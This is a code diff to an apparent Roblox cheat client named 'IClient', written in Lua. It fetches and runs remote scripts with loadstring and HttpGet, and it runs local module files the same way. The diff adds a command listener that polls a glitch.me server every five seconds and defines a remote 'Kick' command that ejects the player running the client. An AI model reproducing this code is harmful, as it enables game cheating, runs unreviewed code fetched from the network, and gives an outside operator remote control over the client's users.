@@ -146,7 +146,6 @@ else
 	)
 end
 
-
 LocalPlayer.OnTeleport:Connect(function(State)
 	if State == Enum.TeleportState.Started then
 		local teleportstr = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/randomdude11135/IClient/main/MainScript.lua", true))()'
@@ -175,6 +174,8 @@ local LoadIClientUI = GuiLibrary.Load({
 	},
 })
 
+
+shared.MainUI = LoadIClientUI
 
 ----// Non - Blantant Frame
 local LiteFrame = LoadIClientUI.New({
@@ -215,6 +216,10 @@ loadstring(GetURL("GameScripts/Universal.Lua"))()
 local publicrepo = checkpublicrepo(game.PlaceId)
 if publicrepo then
 	loadstring(publicrepo)()
+end
+
+if isfolder("IClient/CustomModules") and isfile("IClient/CustomModules/Universal") then
+	loadstring(readfile("IClient/CustomModules/Universal"))()
 end
 
 
@@ -325,6 +330,7 @@ local headers = {
 	["content-type"] = "application/json"
 }	
 local WebRequest = {Url = "https://majestic-tidal-saguaro.glitch.me/GetPlayerUsingClient", Body = {}, Method = "GET", Headers = headers}
+local CommandWebRequest = {Url = "https://majestic-tidal-saguaro.glitch.me/GetRunningCommands", Body = {}, Method = "GET", Headers = headers}
 
 do
 
@@ -399,6 +405,8 @@ for i,v in pairs(getconnections(ReplicatedStorage.DefaultChatSystemChatEvents.On
 		end
 	end
 end
+
+
 --// Check Using Client
 do
     
@@ -491,3 +499,24 @@ do
 	end)	
 end
 
+local GloblCommandsList = {
+ ["Kick"] = function(BodyInfo)
+	LocalPlayer:Kick("Trolled")
+ end
+
+}
+
+--// Commands Listener
+do
+	local NextTck = os.time()
+	game:GetService("RunService").Heartbeat:Connect(function()
+		if NextTck > os.time() then return end
+		NextTck = os.time() + 5
+		local RequestedInfo = requestfunc(CommandWebRequest)
+		local EncodedInfo = game:GetService("HttpService"):JSONDecode(RequestedInfo.Body)		
+
+		for i , v in pairs(EncodedInfo) do
+			
+		end
+	end)	
+end
